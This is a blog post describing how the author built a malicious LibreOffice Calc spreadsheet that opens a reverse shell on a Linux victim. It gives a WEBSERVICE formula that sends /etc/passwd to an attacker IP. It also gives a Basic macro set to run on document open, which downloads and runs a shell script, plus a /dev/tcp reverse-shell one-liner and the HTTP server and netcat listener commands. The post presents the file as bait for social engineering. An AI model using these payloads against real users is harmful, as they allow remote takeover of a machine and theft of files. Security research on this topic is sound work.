

##
#
https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
#
##

USING MALICIOUS LIBREOFFICE CALC MACROS TO TARGET LINUX
 




I've been wondering for a while about the viability and methodology of pwning a Linux box via a malicious LibreOffice Calc spreadsheet so I decided to do some experimentation. This post outlines my research and findings.

Best I can tell, LibreOffice removed DDE functionality as it pertains to arbitrary operating system commands with the advent of CVE-2014-3524. (Please comment and correct me if I'm wrong.) This apparently means it's no longer possible to perform operating system commands with Excel-style attacks, which potentially rules out running operating system commands via CSV injection. Still, there are are some pretty cool data exfiltration exploits out there with LibreOffice Calc formulas that utilize the WEBSERVICE function like this one:

=WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))

But if you want to achieve operating system command execution, it seems you will need a LibreOffice Calc macro, written in LibreOffice Basic, a dialect of BASIC. I'm going to show you how I achieved a reverse shell in my lab, using a such macro. It may not be elegant, but it works. Please feel free to comment if you know of a simpler way.

Before I start, keep in mind there are lots of caveats to exploits embedded in spreadsheets. With any luck, the victim's instance of Calc is configured with a lenient setting for macros and the victim has been conditioned to click through warnings. On the other hand, Linux is not widely used by unsavvy users, making the chance of social engineering more difficult.

In order to duplicate what I've done here, you will need both an HTTP server to host a malicious file, and a C2. The former can be done easily with Python, and the latter with netcat.

With these caveats in mind, let's get started. The first thing we need is a benign looking Calc spreadsheet, with some mock data for use with social engineering. Then we need to create a malicious macro within this spreadsheet. To create the macro, navigate to the following:

Tools>Macros>Organize Macros>Basic...

Once there, you should see My Macros, LibreOffice Macros, and the current filename. To make our macro apply only to our malicious file, we need to select our filename and click 'New'. You can name it anything and then click 'OK'. The Object Catalog should then open, with your new macro selected and ready for edits. The exploit I'm using is below. I tried reverse shell one liners, but ran into problems and found it easiest for the payload to download a malicious shell script and then execute it. You could also replace this with an msfvenom payload. To use my exploit, replace all of the sample text in your macro with the following:

```
Sub evil

    Shell("wget http://127.0.0.1:665/reverse-shell.sh")
    Shell("chmod +x reverse-shell.sh")
    Shell("bash -c ./reverse-shell.sh")
    
End Sub
```

Once this is complete, close the window and I'll show you how to assign the macro to the 'Open Document' event so it will be run when opening the spreadsheet. NOTE: It's important that you close the Object Catalog window and reopen the Organize Macros window when performing this action, otherwise it won't be possible to assign document-specific macros to events. (I found that the Organize Macros window won't let you assign document-specific macros to events if opened from the Object Catalog window.) Below are the steps to perform after closing the Object Catalog window. You'll need to navigate here again:

Tools>Macros>Organize Macros>Basic...

This time, you'll select your new document-specific macro and click 'Assign...'  Then select the 'Open Document' event and click 'Macro...' Navigate to and select your new macro and then click 'OK' and 'Close'. (If you configured it correctly, the event should look like the screenshot below.)



Next, it's time to prepare our malicious shell script which will be downloaded by our macro, and our C2. Create a file called reverse-shell.sh and populate it with this text:

exec 5<>/dev/tcp/127.0.0.1/666 ; cat <&5 | while read muahaha; do $muahaha 2>&5 >&5; done

Then host the file on your malware server using Python3:

sudo python3 -m http.server 665

And start your C2:

sudo nc -lp 666

Now close and reopen your malicious file, and you should have a reverse shell on your C2. Type whoami, etc. from netcat and if everything looks good, you should be ready to launch your social engineering attack. If you have trouble, check your security settings in Calc and make sure you click through any warnings. (Also, I noticed that if I try the exploit a second time it doesn't work unless I delete reverse-shell.sh each time.)

I now feel I have a better idea of exactly what attacks can be done with LibreOffice Calc and how to protect myself. Needless to say, one must be vigilant when it comes to untrusted files.

Links:
https://notsosecure.com/data-exfiltration-formula-injection-part1
https://www.cvedetails.com/cve/CVE-2014-3524/
https://blog.documentfoundation.org/blog/2014/08/28/libreoffice-4-3-1-fresh-announced/
https://wiki.openoffice.org/wiki/Documentation/BASIC_Guide/Other_Functions_(Runtime_Library)
https://wiki.documentfoundation.org/images/d/da/CG7210-LinkingCalcData.pdf
https://ask.libreoffice.org/t/auto-run-macro-on-open-cant-assign-to-macro-in-document/5474
https://help.libreoffice.org/6.1/he/text/sbasic/shared/03130500.html
https://help.libreoffice.org/Basic/Shell_Function_Runtime
https://stackoverflow.com/questions/11969378/running-a-os-command-from-a-macro
https://documentation.libreoffice.org/assets/Uploads/Documentation/en/CG4.1/PDF/CG4112-CalcMacros.pdf

Test environment:
Kali Linux 2022.1
LibreOffice Calc 7.3.1.1
